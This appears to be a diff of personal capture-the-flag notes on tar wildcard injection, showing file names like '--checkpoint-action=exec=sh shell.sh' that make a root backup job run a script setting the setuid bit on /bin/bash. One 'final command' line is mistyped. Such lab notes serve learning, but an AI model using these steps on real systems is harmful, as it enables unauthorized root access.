@@ -23,10 +23,23 @@ tar czf /tmp/backup.tar.gz *
 
 So, create checkpoint first
 #touch /home/user/--checkpoint=1
-#touch /home/user/--checkpoint-action=exec=shell.elf (instead shell.elf you can change /bin/bash or whatever)
+#touch /home/user/--checkpoint-action=exec=shell.elf 
 
 So,final command is like. ( we just inject the payload in the place of *(wild-card))
 tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.elf
+____________________________________________________________________________________________________________________________
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+#cd /var/www/html
+#printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+#echo "" > "--checkpoint-action=exec=sh shell.sh"
+#echo "" > --checkpoint=1
+
+when you remove 
+#rm -rf /var/www/html/--checkpoint=1
+
 
 
 
